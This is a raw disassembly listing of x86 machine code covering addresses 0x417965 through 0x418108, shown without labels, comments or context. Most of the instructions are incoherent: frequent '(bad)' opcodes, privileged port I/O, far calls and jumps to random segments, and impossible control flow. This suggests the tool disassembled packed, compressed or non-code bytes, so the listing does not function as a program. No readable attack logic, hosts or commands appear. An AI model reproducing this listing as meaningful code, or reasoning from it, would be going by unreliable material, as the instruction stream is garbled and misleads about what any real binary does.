  417965:	enter  0xbbe0,0x86
  417969:	and    al,0x8c
  41796b:	mov    WORD PTR [ebx+0x18a0b9],es
  417971:	mov    ebx,0x7e7287d0
  417976:	sbb    ch,BYTE PTR [eax+0x4f4e2c0f]
  41797c:	sbb    esi,ebp
  41797e:	mov    dh,0xa9
  417980:	fnsave [edx+0x3]
  417983:	data16 mov ?,WORD PTR [ebx]
  417986:	and    ch,ch
  417988:	test   esi,ebp
  41798a:	daa    
  41798b:	mov    bh,BYTE PTR es:[edx+0x48]
  41798f:	push   ebx
  417990:	mov    cl,0x12
  417992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417993:	lahf   
  417994:	inc    ebx
  417995:	(bad)  [esi+0x72]
  417998:	inc    esp
  417999:	or     DWORD PTR [esi+esi*2+0xd1],edi
  4179a0:	add    BYTE PTR [eax],al
  4179a2:	es mov ah,0x71
  4179a5:	jno    0x41799a
  4179a7:	cmc    
  4179a8:	div    DWORD PTR es:[edx+0x8]
  4179ac:	mov    eax,ds:0x88a53e75
  4179b1:	mov    edx,0xf71e
  4179b6:	repz add al,0x0
  4179b9:	add    BYTE PTR [ecx+0x1b],cl
  4179bc:	adc    BYTE PTR [ecx+0x4a],bh
  4179bf:	push   esp
  4179c0:	push   ebp
  4179c1:	hlt    
  4179c2:	mov    ebp,0xb4528001
  4179c7:	jmp    0x4179dd
  4179c9:	cmp    al,0x65
  4179cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179cc:	push   esp
  4179cd:	push   0xd1faae74
  4179d2:	stc    
  4179d3:	cli    
  4179d4:	push   ds
  4179d5:	rcr    BYTE PTR ds:0x953eefc7,1
  4179db:	cli    
  4179dc:	and    bh,bh
  4179de:	dec    ebp
  4179df:	mov    bl,0x7f
  4179e1:	mov    cl,0x17
  4179e3:	js     0x417a50
  4179e5:	mov    dl,0xf9
  4179e7:	rcl    DWORD PTR [ebx-0x2a],1
  4179ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179eb:	clc    
  4179ec:	jg     0x4179fb
  4179ee:	mov    edx,0x9893180b
  4179f3:	xor    eax,0x73d6aa21
  4179f8:	(bad)  
  4179f9:	cmp    al,bh
  4179fb:	adc    eax,0xf81bb347
  417a00:	push   ebx
  417a01:	push   es
  417a02:	xchg   esp,eax
  417a03:	pop    es
  417a04:	xchg   edx,eax
  417a05:	push   ds
  417a06:	push   edi
  417a07:	sahf   
  417a08:	cli    
  417a09:	dec    esi
  417a0a:	pop    edx
  417a0b:	push   es
  417a0c:	push   0xca91fbed
  417a11:	fwait
  417a12:	enter  0x45ad,0x12
  417a16:	mov    bh,0x86
  417a18:	sub    BYTE PTR [ecx],cl
  417a1a:	add    al,0x91
  417a1c:	mov    al,bl
  417a1e:	dec    ebx
  417a1f:	mov    al,0x78
  417a21:	sub    al,0x8e
  417a23:	cwde   
  417a24:	mov    ah,0x38
  417a26:	(bad)  
  417a27:	xchg   BYTE PTR [edi],ah
  417a29:	lea    ecx,[ebx+0x37]
  417a2c:	ss ret 0xd798
  417a30:	cmp    eax,0x85834094
  417a35:	mov    ecx,DWORD PTR [edi+ebp*4-0x25ca527f]
  417a3c:	js     0x417a17
  417a3e:	leave  
  417a3f:	ret    
  417a40:	cdq    
  417a41:	fld    TBYTE PTR [ebx+eiz*8]
  417a44:	pop    edx
  417a45:	pushf  
  417a46:	icebp  
  417a47:	mov    BYTE PTR [edx-0x3721b510],ch
  417a4d:	bound  ebp,QWORD PTR [esi+edx*8-0x7c8ffcde]
  417a54:	adc    eax,0x110bce60
  417a59:	lahf   
  417a5a:	shl    edx,0x11
  417a5d:	or     cl,ah
  417a5f:	enter  0xa19b,0x53
  417a63:	dec    ebp
  417a64:	sbb    eax,0x82c2dea4
  417a69:	mov    dh,cl
  417a6b:	ror    ebx,0x22
  417a6e:	stos   BYTE PTR es:[edi],al
  417a6f:	retf   
  417a70:	jae    0x417a3c
  417a72:	pop    ss
  417a73:	jno    0x417a43
  417a75:	add    BYTE PTR [esi],ah
  417a77:	sbb    al,0x1d
  417a79:	jae    0x417a50
  417a7b:	xchg   ebp,eax
  417a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a7d:	mov    dh,0xf9
  417a7f:	dec    eax
  417a80:	mov    ds:0xcd436b47,al
  417a85:	jl     0x417a79
  417a87:	inc    edx
  417a88:	sub    edi,DWORD PTR ds:0x712cf3ef
  417a8e:	mov    bl,0x74
  417a90:	je     0x417ab8
  417a92:	aad    0x88
  417a94:	sbb    esp,DWORD PTR [edi+0x7aa08ae5]
  417a9a:	sub    ecx,esi
  417a9c:	xor    ah,BYTE PTR [ecx+0x40a27753]
  417aa2:	mov    ?,edx
  417aa4:	leave  
  417aa5:	sti    
  417aa6:	out    dx,al
  417aa7:	pushf  
  417aa8:	mov    al,0x4
  417aaa:	dec    eax
  417aab:	data16 or al,0xc4
  417aae:	jnp    0x417aa6
  417ab0:	push   ebp
  417ab1:	dec    esp
  417ab2:	xchg   ecx,eax
  417ab3:	mov    bl,BYTE PTR [ecx-0x1]
  417ab6:	jmp    DWORD PTR [ecx+0x34d8b799]
  417abc:	mov    di,0x50b9
  417ac0:	cld    
  417ac1:	jecxz  0x417ac6
  417ac3:	mov    ah,0x84
  417ac5:	int    0x9e
  417ac7:	xchg   esi,eax
  417ac8:	scas   al,BYTE PTR es:[edi]
  417ac9:	mov    esp,0xba461918
  417ace:	shl    bl,cl
  417ad0:	loopne 0x417b3d
  417ad2:	outs   dx,BYTE PTR ds:[esi]
  417ad3:	jecxz  0x417ad4
  417ad5:	out    0x19,eax
  417ad7:	jmp    0x6c47ee8d
  417adc:	or     BYTE PTR [edx+0x27],bl
  417adf:	mov    ebx,0x326f27cd
  417ae4:	mov    eax,0x3ca42de9
  417ae9:	and    dl,bl
  417aeb:	sar    eax,0x15
  417aee:	data16 adc BYTE PTR [ebp+0x6d],dl
  417af2:	adc    al,ah
  417af4:	ja     0x417b4d
  417af6:	inc    ecx
  417af7:	pop    esi
  417af8:	out    dx,al
  417af9:	add    eax,0x7f6a865d
  417afe:	mov    edi,0x91f09c8d
  417b03:	sub    eax,ebp
  417b05:	mov    ds:0x5a5fbd64,eax
  417b0a:	push   es
  417b0b:	add    al,0xf
  417b0d:	xchg   DWORD PTR [eax-0x54d68cb2],edi
  417b13:	fstp   QWORD PTR ds:0x9f6b93d5
  417b19:	xor    al,BYTE PTR [eax-0x4f]
  417b1c:	lods   al,BYTE PTR ds:[esi]
  417b1d:	or     dh,BYTE PTR [esi-0x23581499]
  417b23:	sbb    eax,0xee51a889
  417b28:	pop    ebx
  417b29:	sti    
  417b2a:	xchg   DWORD PTR [edi+0x4c5ca59],edi
  417b30:	clc    
  417b31:	stos   BYTE PTR es:[edi],al
  417b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b33:	dec    edi
  417b34:	out    dx,al
  417b35:	mov    ebx,cs
  417b37:	pop    ebx
  417b38:	sub    ch,BYTE PTR [edi]
  417b3a:	adc    ecx,DWORD PTR [eax+0x9]
  417b3d:	mov    ch,0xcc
  417b3f:	xchg   ecx,eax
  417b40:	xchg   ebx,eax
  417b41:	outs   dx,BYTE PTR ds:[esi]
  417b42:	sub    eax,0xa22426c6
  417b47:	cwde   
  417b48:	add    esi,DWORD PTR [edx-0x5ea0930c]
  417b4e:	out    0x5f,al
  417b50:	test   ebx,esp
  417b52:	hlt    
  417b53:	xor    bh,ah
  417b55:	out    0x40,al
  417b57:	js     0x417b90
  417b59:	leave  
  417b5a:	ds mov ch,0x85
  417b5d:	popa   
  417b5e:	and    al,0x6
  417b60:	imul   eax,DWORD PTR [edi-0x10],0x6c5d338
  417b67:	xor    ecx,DWORD PTR [eax+esi*8]
  417b6a:	cmp    al,0x51
  417b6c:	or     BYTE PTR [ebp-0x77],ch
  417b6f:	mov    ch,0x48
  417b71:	cmp    ah,ah
  417b73:	jne    0x417afd
  417b75:	pop    edx
  417b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b77:	inc    ebp
  417b78:	mov    eax,ds:0xe210e48f
  417b7d:	add    DWORD PTR [ebp-0x1139f16],eax
  417b83:	pop    ebx
  417b84:	push   0xba2fad1f
  417b89:	xor    eax,0x1c6941a8
  417b8e:	rcl    bh,cl
  417b90:	leave  
  417b91:	out    0xaa,al
  417b93:	scas   eax,DWORD PTR es:[edi]
  417b94:	ja     0x417b96
  417b96:	sub    ebp,DWORD PTR [edi-0x680d5257]
  417b9c:	call   0xd5f5051a
  417ba1:	sub    esi,DWORD PTR [ecx+0x3c]
  417ba4:	rcr    DWORD PTR [ebp+0x328a1747],0xbe
  417bab:	xor    edi,ecx
  417bad:	xchg   ah,cl
  417baf:	jmp    0x81e642b2
  417bb4:	fldcw  WORD PTR [edx+0xefc770c]
  417bba:	stos   DWORD PTR es:[edi],eax
  417bbb:	sub    eax,edx
  417bbd:	xor    bh,bl
  417bbf:	nop
  417bc0:	mov    eax,ds:0xb01e1588
  417bc5:	inc    esp
  417bc6:	add    DWORD PTR [edx-0x3d],edi
  417bc9:	sbb    DWORD PTR [ebp+edi*1+0x31],ebx
  417bcd:	je     0x417bec
  417bcf:	(bad)  
  417bd0:	sar    BYTE PTR [ebx+eiz*1],cl
  417bd3:	enter  0x74d8,0xff
  417bd7:	out    dx,al
  417bd8:	adc    al,0x82
  417bda:	xchg   ebx,eax
  417bdb:	stos   DWORD PTR es:[edi],eax
  417bdc:	mov    al,ds:0xecbf6770
  417be1:	pop    edx
  417be2:	cwde   
  417be3:	(bad)  
  417be4:	mov    bl,0x57
  417be6:	mov    BYTE PTR [ebp+ebx*8-0x734ea3c0],bl
  417bed:	mov    edx,es
  417bef:	inc    ebp
  417bf0:	adc    al,0xf7
  417bf2:	dec    edx
  417bf3:	xchg   ebp,esi
  417bf5:	push   esi
  417bf6:	push   es
  417bf7:	sub    eax,0x1ba67cc2
  417bfc:	ja     0x417bff
  417bfe:	(bad)  
  417bff:	(bad)  
  417c00:	jnp    0x417c7a
  417c02:	mov    edi,0x1ebb285a
  417c07:	add    BYTE PTR [ebp+0x68],bl
  417c0a:	xchg   ebp,eax
  417c0b:	pusha  
  417c0c:	pop    ss
  417c0d:	push   ecx
  417c0e:	xor    BYTE PTR [ecx-0x370634ee],ah
  417c14:	mov    bh,0x55
  417c16:	sbb    DWORD PTR [edi+0x460ff5a0],eax
  417c1c:	shr    BYTE PTR [eax-0x41],1
  417c1f:	or     eax,0x6bae48
  417c24:	cmp    ch,ah
  417c26:	sbb    DWORD PTR [ebp+0x42],0xfffffff8
  417c2a:	test   eax,0x285ea3eb
  417c2f:	pop    ds
  417c30:	mov    gs,eax
  417c32:	dec    esi
  417c33:	add    dh,BYTE PTR [eax]
  417c35:	jo     0x417c54
  417c37:	lods   al,BYTE PTR ds:[esi]
  417c38:	xchg   BYTE PTR [edi-0x61],bh
  417c3b:	loop   0x417c74
  417c3d:	sub    al,0xf2
  417c3f:	jo     0x417caa
  417c41:	mov    esi,0xd9f65f43
  417c46:	popa   
  417c47:	retf   
  417c48:	mov    dl,0x70
  417c4a:	jne    0x417c87
  417c4c:	jl     0x417cc6
  417c4e:	ucomiss xmm1,DWORD PTR [edi+0xa13e3f1]
  417c55:	jge    0x417c9a
  417c57:	fild   WORD PTR [ebp-0xf]
  417c5a:	pop    ecx
  417c5b:	ins    DWORD PTR es:[edi],dx
  417c5c:	test   cl,ah
  417c5e:	scas   al,BYTE PTR es:[edi]
  417c5f:	mov    ecx,0xfd13bf31
  417c64:	xchg   edx,eax
  417c65:	mov    ds:0x16c0e9ed,eax
  417c6a:	aam    0xb4
  417c6c:	pop    eax
  417c6d:	cmp    al,0x78
  417c6f:	scas   al,BYTE PTR es:[edi]
  417c70:	cdq    
  417c71:	fidivr DWORD PTR [esi]
  417c73:	jne    0x417cb4
  417c75:	mov    edi,0x4e34ebbb
  417c7a:	js     0x417cc2
  417c7c:	scas   eax,DWORD PTR es:[edi]
  417c7d:	mov    BYTE PTR [edx+0x5c06cb45],bh
  417c83:	add    bh,BYTE PTR [ebp+0x57]
  417c86:	adc    eax,0xaa79442d
  417c8b:	test   bh,ah
  417c8d:	sub    edx,DWORD PTR [esi+0x4]
  417c90:	outs   dx,BYTE PTR ds:[esi]
  417c91:	repnz add al,0xd0
  417c94:	mov    ecx,0xc1f7e347
  417c99:	jb     0x417c38
  417c9b:	cli    
  417c9c:	push   eax
  417c9d:	es mov cl,0xef
  417ca0:	xlat   BYTE PTR ds:[ebx]
  417ca1:	scas   al,BYTE PTR es:[edi]
  417ca2:	cli    
  417ca3:	shl    BYTE PTR [edi],1
  417ca5:	mov    edi,0xa07d99bf
  417caa:	lahf   
  417cab:	push   ss
  417cac:	aad    0x1f
  417cae:	sbb    bh,BYTE PTR [ebx]
  417cb0:	es and eax,0x33359d49
  417cb6:	pop    gs
  417cb8:	jmp    0x80853e63
  417cbd:	shl    BYTE PTR [ecx],0x56
  417cc0:	int3   
  417cc1:	test   esi,edx
  417cc3:	xchg   ebp,eax
  417cc4:	xor    al,0x3f
  417cc6:	test   BYTE PTR [eax],dl
  417cc8:	(bad)  
  417cca:	fmul   DWORD PTR [ecx+0x6f]
  417ccd:	xor    ch,0xfc
  417cd0:	cmp    eax,0xdc59f536
  417cd5:	add    ecx,DWORD PTR [edx-0x2c023053]
  417cdb:	jl     0x417c66
  417cdd:	dec    ecx
  417cde:	in     al,dx
  417cdf:	aad    0xdd
  417ce1:	clc    
  417ce2:	enter  0xacea,0x7b
  417ce6:	int3   
  417ce7:	inc    ebp
  417ce8:	cmp    BYTE PTR [ebp-0x702fadd1],0x7c
  417cef:	pop    ecx
  417cf0:	jne    0x417d37
  417cf2:	sbb    dl,BYTE PTR [ecx]
  417cf4:	daa    
  417cf5:	adc    eax,0x87778f06
  417cfa:	in     eax,dx
  417cfb:	push   ebx
  417cfc:	mov    al,ds:0x4f6051db
  417d01:	stos   DWORD PTR es:[edi],eax
  417d02:	rcr    DWORD PTR cs:[esi-0x20fee8e5],cl
  417d09:	xchg   ebp,eax
  417d0a:	add    bh,cl
  417d0c:	lods   eax,DWORD PTR ds:[esi]
  417d0d:	xor    al,0x70
  417d0f:	retf   
  417d10:	daa    
  417d11:	and    ebp,ebx
  417d13:	mov    eax,ds:0x8ff822a1
  417d18:	sub    DWORD PTR [esp+ebp*1],ebp
  417d1b:	fwait
  417d1c:	call   0x32b6636b
  417d21:	or     eax,0xa88c79f1
  417d26:	mov    BYTE PTR [ebx+0x749bc441],dl
  417d2c:	push   es
  417d2d:	pop    esi
  417d2e:	ficomp DWORD PTR [ebx]
  417d30:	sbb    BYTE PTR [ebx],al
  417d32:	dec    eax
  417d33:	dec    esi
  417d34:	push   edi
  417d35:	push   ebx
  417d36:	pop    esp
  417d37:	and    ch,0xa5
  417d3a:	lods   eax,DWORD PTR ds:[esi]
  417d3b:	lods   al,BYTE PTR ds:[esi]
  417d3c:	cmp    edi,esp
  417d3e:	push   0xc
  417d40:	enter  0x2101,0x11
  417d44:	dec    ebp
  417d45:	adc    ch,BYTE PTR [edi+0x28]
  417d48:	inc    ebx
  417d49:	mov    ch,0x9e
  417d4b:	push   0xffffffde
  417d4d:	xchg   ebp,eax
  417d4e:	and    ecx,0xcd4c914d
  417d54:	adc    DWORD PTR [edi-0x3c050c08],esp
  417d5a:	movlps xmm4,QWORD PTR [ecx]
  417d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d5e:	leave  
  417d5f:	sar    BYTE PTR [esi+0x17],cl
  417d62:	xchg   ebp,eax
  417d63:	cmc    
  417d64:	leave  
  417d65:	add    DWORD PTR [eax-0x62],0xaba9d518
  417d6c:	push   eax
  417d6d:	xchg   edi,eax
  417d6e:	cdq    
  417d6f:	push   eax
  417d70:	add    al,0x37
  417d72:	inc    edi
  417d73:	into   
  417d74:	mov    ecx,0xdbc085ce
  417d79:	adc    al,0x53
  417d7b:	fcomp  QWORD PTR [edx-0x26]
  417d7e:	aad    0x2b
  417d80:	lds    edi,FWORD PTR [ecx+0x4d]
  417d83:	inc    edi
  417d84:	cs inc ecx
  417d86:	mov    WORD PTR [ebx+0xcbb9f49],es
  417d8c:	repnz push ss
  417d8e:	mov    cr7,esp
  417d91:	and    al,0x1d
  417d93:	sbb    eax,DWORD PTR fs:[edi+0x23]
  417d97:	imul   edi,DWORD PTR [esi],0x32721e20
  417d9d:	lods   al,BYTE PTR ds:[esi]
  417d9e:	push   ebx
  417d9f:	pop    esp
  417da0:	ins    BYTE PTR es:[edi],dx
  417da1:	addr16 daa 
  417da3:	and    al,0xaa
  417da5:	out    dx,eax
  417da6:	sbb    eax,0x8e0c1c5b
  417dab:	xor    BYTE PTR [ebp+0x5d8ba657],dh
  417db1:	repz jle 0x417ddc
  417db4:	mov    ss,WORD PTR [edi-0xa6dc087]
  417dba:	pop    ss
  417dbb:	xchg   edi,eax
  417dbc:	jecxz  0x417d5a
  417dbe:	popa   
  417dbf:	mov    dh,0x65
  417dc1:	popa   
  417dc2:	outs   dx,DWORD PTR ds:[esi]
  417dc3:	mov    eax,ds:0x7cdf36dc
  417dc8:	push   ebx
  417dc9:	js     0x417dba
  417dcb:	call   0xd43a:0x4e0a203f
  417dd2:	popa   
  417dd3:	adc    al,0x98
  417dd5:	jbe    0x417e40
  417dd7:	fbld   TBYTE PTR [ecx+eiz*4]
  417dda:	jp     0x417de6
  417ddc:	push   ecx
  417ddd:	test   eax,0xdaed1f8c
  417de2:	mov    ch,0x31
  417de4:	jb     0x417dde
  417de6:	stc    
  417de7:	pop    esi
  417de8:	xchg   bp,ax
  417dea:	pop    edi
  417deb:	push   es
  417dec:	jnp    0x417db7
  417dee:	xor    DWORD PTR [edx-0x69],edi
  417df1:	aam    0xe4
  417df3:	loope  0x417dce
  417df5:	sub    esi,DWORD PTR [edx+eiz*2+0x6a189960]
  417dfc:	inc    esp
  417dfd:	packssdw mm1,mm6
  417e00:	xchg   ebx,eax
  417e01:	(bad)  
  417e02:	adc    DWORD PTR [edi+0x20b7aa70],edi
  417e08:	js     0x417e17
  417e0a:	(bad)  
  417e0b:	aaa    
  417e0c:	popa   
  417e0d:	pop    es
  417e0e:	mov    ss,WORD PTR [edx-0x675d1288]
  417e14:	aaa    
  417e15:	cli    
  417e16:	lds    ebp,FWORD PTR [edi-0x6a3cd65]
  417e1c:	hlt    
  417e1d:	(bad)  
  417e1e:	jmp    0x417e28
  417e20:	xchg   ebp,eax
  417e21:	pusha  
  417e22:	sub    edi,DWORD PTR [ecx+eax*4]
  417e25:	lock fcomi st,st(4)
  417e28:	sbb    al,0xd4
  417e2a:	sar    DWORD PTR [ebx+0x59],1
  417e2d:	btr    ebp,0x8a
  417e31:	mov    ecx,0x98252839
  417e36:	pop    ecx
  417e37:	cld    
  417e38:	pop    eax
  417e39:	aad    0x5b
  417e3b:	(bad)  
  417e3c:	(bad)  
  417e3d:	in     al,dx
  417e3e:	sub    eax,0x3a89cbf7
  417e43:	jmp    0xc3c76f49
  417e48:	xchg   esp,eax
  417e49:	inc    eax
  417e4a:	lds    ebx,FWORD PTR [ebp-0x47]
  417e4d:	rol    BYTE PTR [edi],1
  417e4f:	jle    0x417e12
  417e51:	(bad)  
  417e52:	jb     0x417e2a
  417e54:	std    
  417e55:	adc    BYTE PTR [esi],bh
  417e57:	call   0x6ef4:0xb125121c
  417e5e:	push   ebx
  417e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e60:	dec    ecx
  417e61:	outs   dx,BYTE PTR ds:[esi]
  417e62:	fwait
  417e63:	pusha  
  417e64:	lds    esp,FWORD PTR [edi-0x37]
  417e67:	pop    ecx
  417e68:	call   0x58a7:0x1189c65e
  417e6f:	sahf   
  417e70:	sahf   
  417e71:	lock fistp QWORD PTR [edx+0x70]
  417e75:	and    al,0x63
  417e77:	dec    esi
  417e78:	fdiv   st,st(6)
  417e7a:	mov    dh,bh
  417e7c:	push   eax
  417e7d:	sub    al,0x27
  417e7f:	mov    edx,DWORD PTR [eax]
  417e81:	shr    BYTE PTR [ecx],0xf5
  417e84:	(bad)  
  417e85:	push   esi
  417e86:	xor    eax,0xdce8a6a8
  417e8b:	jp     0x417e4a
  417e8d:	addr16 mov ebp,0x4fa28b6b
  417e93:	add    al,0x96
  417e95:	fwait
  417e96:	scas   al,BYTE PTR es:[edi]
  417e97:	(bad)  
  417e98:	scas   al,BYTE PTR es:[edi]
  417e99:	int3   
  417e9a:	shr    esp,0x8e
  417e9d:	call   0x5292:0xb9434fae
  417ea4:	inc    ebx
  417ea5:	ss idiv edi
  417ea8:	mov    bl,BYTE PTR [eax]
  417eaa:	cmp    bl,BYTE PTR [ebx+0xf9]
  417eb0:	add    BYTE PTR [eax],al
  417eb2:	ret    0x939e
  417eb5:	inc    edi
  417eb6:	fisttp WORD PTR [edi-0x2a]
  417eb9:	lahf   
  417eba:	int    0x45
  417ebc:	push   eax
  417ebd:	comiss xmm7,xmm5
  417ec0:	std    
  417ec1:	cmp    DWORD PTR [ecx],edx
  417ec3:	cld    
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	repz add al,0x0
  417ec9:	add    BYTE PTR [ebp+0x5a016f24],cl
  417ecf:	mov    ah,0x7
  417ed1:	mul    bl
  417ed3:	mov    dh,0x4c
  417ed5:	inc    edx
  417ed6:	push   esp
  417ed7:	adc    eax,0x9cb8ede3
  417edc:	mov    bl,0x58
  417ede:	mov    edx,0x41de1fe0
  417ee3:	jnp    0x417ee8
  417ee5:	sti    
  417ee6:	adc    DWORD PTR [ebx],0xffffffe2
  417ee9:	sbb    DWORD PTR [edi+edi*4+0x5e3b97f7],esi
  417ef0:	cmp    ebx,ecx
  417ef2:	sti    
  417ef3:	shl    DWORD PTR [ebp+0x2d],cl
  417ef6:	rcl    dl,cl
  417ef8:	mov    ch,0x8d
  417efa:	stc    
  417efb:	mov    edx,0x9213bbe4
  417f00:	pushf  
  417f01:	enter  0xbd86,0xfe
  417f05:	les    ebp,FWORD PTR [esi-0x27]
  417f08:	retf   0xc568
  417f0b:	push   cs
  417f0c:	sahf   
  417f0d:	imul   edx,DWORD PTR [eax+eiz*2],0xe6ae9858
  417f14:	jp     0x417e98
  417f16:	cmp    DWORD PTR [esi+0x3863a860],0x1
  417f1d:	mov    edi,0x8a74c72c
  417f22:	dec    eax
  417f23:	call   FWORD PTR [bp-0x60]
  417f27:	push   ecx
  417f28:	inc    ebp
  417f29:	aaa    
  417f2a:	mov    ch,BYTE PTR [esi]
  417f2c:	jl     0x417fa8
  417f2e:	xor    BYTE PTR [eax+0x46],dh
  417f31:	pop    esp
  417f32:	ror    bl,cl
  417f34:	push   esp
  417f35:	adc    esp,ebp
  417f37:	out    0x53,al
  417f39:	inc    BYTE PTR [eax+0x339e86b2]
  417f3f:	dec    ebx
  417f40:	sub    al,0x31
  417f42:	in     al,dx
  417f43:	xchg   ebx,eax
  417f44:	sub    al,0xb5
  417f46:	rol    DWORD PTR [esp+eiz*8],1
  417f49:	ret    
  417f4a:	call   0x3996:0x17484bf1
  417f51:	sbb    DWORD PTR [eax],esp
  417f53:	pop    edx
  417f54:	sbb    ch,dl
  417f56:	xor    DWORD PTR [eax+0x346ab858],edi
  417f5c:	neg    BYTE PTR [edx-0x72]
  417f5f:	rcr    BYTE PTR [ecx],0xc9
  417f62:	sbb    cl,BYTE PTR ds:0x371eb57f
  417f68:	dec    ecx
  417f69:	jbe    0x417fdd
  417f6b:	repnz or edi,esi
  417f6e:	dec    ebx
  417f6f:	test   DWORD PTR [eax-0x4bae1c13],ebx
  417f75:	iret   
  417f76:	(bad)
  417f7a:	ret    0x1b82
  417f7d:	xchg   DWORD PTR [ebx+0x24e8c24b],esi
  417f83:	jl     0x417fbe
  417f85:	mov    ds:0x2e301a32,al
  417f8a:	rol    edi,1
  417f8c:	pushf  
  417f8d:	mov    ch,0xc9
  417f8f:	je     0x417f64
  417f91:	xchg   ecx,eax
  417f92:	lea    esi,[ebx]
  417f94:	xchg   ebp,eax
  417f95:	ss dec esp
  417f97:	arpl   sp,ax
  417f99:	(bad)  
  417f9a:	fidivr DWORD PTR [edi+0x6a]
  417f9d:	and    dh,BYTE PTR [ebp-0x23941e65]
  417fa3:	dec    ebp
  417fa4:	adc    ah,BYTE PTR [edx-0x2]
  417fa7:	sahf   
  417fa8:	and    ebp,edi
  417faa:	cmp    al,0xdb
  417fac:	xchg   ebx,eax
  417fad:	fisttp WORD PTR [eax+esi*8+0x6b]
  417fb1:	xlat   BYTE PTR ds:[ebx]
  417fb2:	push   es
  417fb3:	pop    sp
  417fb5:	loope  0x417f94
  417fb7:	xor    ah,BYTE PTR [edx+0x10ae173]
  417fbd:	outs   dx,DWORD PTR ds:[esi]
  417fbe:	xlat   BYTE PTR ds:[ebx]
  417fbf:	push   ss
  417fc0:	(bad)  
  417fc1:	enter  0xb420,0x38
  417fc5:	std    
  417fc6:	adc    eax,0xf0a7e382
  417fcb:	in     eax,dx
  417fcc:	mov    ebx,0x8e6651d4
  417fd1:	mov    dl,BYTE PTR [ecx+0x1]
  417fd4:	push   edx
  417fd5:	add    ch,cl
  417fd7:	ins    BYTE PTR es:[edi],dx
  417fd8:	mov    al,0x11
  417fda:	or     ebx,DWORD PTR [ebp-0x46]
  417fdd:	add    eax,0x44a5373a
  417fe2:	and    esi,DWORD PTR [edi]
  417fe4:	jmp    0x3ce0:0xb0ed
  417fea:	dec    eax
  417feb:	retf   0x9b5a
  417fee:	or     DWORD PTR [ebp-0x54],eax
  417ff1:	rcl    BYTE PTR [ebx+0x6e43d1f0],cl
  417ff7:	dec    esp
  417ff8:	in     eax,0x41
  417ffa:	mov    cl,0xb3
  417ffc:	test   DWORD PTR [eax],ebp
  417ffe:	rcl    cl,0x94
  418001:	mov    ds:0xbf72efd5,eax
  418006:	inc    ebx
  418007:	cmp    DWORD PTR [ecx-0x52],ebp
  41800a:	(bad)  
  41800b:	sub    esi,DWORD PTR [edx+ecx*4+0x4931ad67]
  418012:	mov    BYTE PTR [ebx+0x239588f1],cl
  418018:	push   edx
  418019:	jne    0x417ff8
  41801b:	add    BYTE PTR ds:0x5cdf736c,ah
  418021:	fimul  DWORD PTR [eax]
  418023:	sbb    al,BYTE PTR [ebx-0x6a]
  418026:	and    esi,DWORD PTR [esi]
  418028:	mov    eax,0xe9f94c6e
  41802d:	call   0x341551ce
  418032:	mov    esp,0x8238539c
  418037:	sbb    DWORD PTR [ebx],ebp
  418039:	test   eax,0xa02cb15b
  41803e:	pop    ds
  41803f:	push   ss
  418040:	frstor [ecx-0x65]
  418043:	or     DWORD PTR [ebx+esi*1],eax
  418046:	jae    0x41803f
  418048:	adc    DWORD PTR [esi-0x46],ebx
  41804b:	lea    eax,[ecx]
  41804d:	push   cs
  41804e:	push   ds
  41804f:	inc    ecx
  418050:	int3   
  418051:	shufps xmm0,XMMWORD PTR [ebx],0x56
  418055:	retf   0x16db
  418058:	repz add al,0xe9
  41805b:	cmp    dl,ch
  41805d:	mov    edx,ebp
  41805f:	fdiv   DWORD PTR [ecx]
  418061:	cdq    
  418062:	aas    
  418063:	push   esi
  418064:	rcr    DWORD PTR [ecx],1
  418066:	add    BYTE PTR [ecx-0x6c],0x18
  41806a:	aam    0x6f
  41806c:	inc    ebp
  41806d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41806e:	fbstp  TBYTE PTR [edx+0x7094bd1]
  418074:	xor    al,0xe
  418076:	and    dh,BYTE PTR [edx-0x31903bf7]
  41807c:	lahf   
  41807d:	addr16 jne 0x41809a
  418080:	imul   esi,DWORD PTR [ecx+0x4f8872a6],0x1f
  418087:	mov    cl,0x89
  418089:	addr16 mov cl,0x60
  41808c:	sbb    eax,0x32895b2b
  418091:	or     ecx,DWORD PTR [ebx]
  418093:	loope  0x4180dd
  418095:	sbb    ecx,ebx
  418097:	hlt    
  418098:	push   cs
  418099:	cmp    edi,DWORD PTR [ebx-0x72627634]
  41809f:	mov    ds:0xb99c583e,eax
  4180a4:	push   esp
  4180a5:	pop    ds
  4180a6:	fs sbb al,0xda
  4180a9:	xor    eax,0xf843d4a7
  4180ae:	pop    edx
  4180af:	cli    
  4180b0:	inc    edx
  4180b1:	cmp    edx,DWORD PTR [ebp-0x35]
  4180b4:	inc    eax
  4180b5:	or     eax,0xc6bb6055
  4180ba:	and    esp,DWORD PTR [ebx]
  4180bc:	inc    ecx
  4180bd:	dec    ecx
  4180be:	cld    
  4180bf:	mov    bh,0x4f
  4180c1:	cmc    
  4180c2:	push   ss
  4180c3:	mov    ah,0xf6
  4180c5:	mov    edi,DWORD PTR [esi]
  4180c7:	jne    0x4180cb
  4180c9:	es jmp 0x465e001
  4180cf:	cmp    bh,BYTE PTR [edi+0x55]
  4180d2:	xchg   esp,eax
  4180d3:	adc    ch,0x9e
  4180d6:	push   0x624060c9
  4180db:	pushf  
  4180dc:	sbb    cl,BYTE PTR [eax+0x6fb8b0cc]
  4180e2:	mov    ah,0xf0
  4180e4:	jl     0x4180f6
  4180e6:	lods   eax,DWORD PTR ds:[esi]
  4180e7:	or     BYTE PTR [ecx],ch
  4180e9:	xor    al,0xa5
  4180eb:	gs cli 
  4180ed:	out    dx,eax
  4180ee:	jb     0x4180e4
  4180f0:	push   es
  4180f1:	push   esi
  4180f2:	inc    esi
  4180f3:	add    BYTE PTR [ecx-0x483dbae0],bh
  4180f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180fa:	xchg   ecx,eax
  4180fb:	inc    esp
  4180fc:	fcom   QWORD PTR [eax-0x59a0e74]
  418102:	js     0x4180ab
  418104:	aam    0x0
  418106:	mov    bl,0xce
  418108:	pop    esi
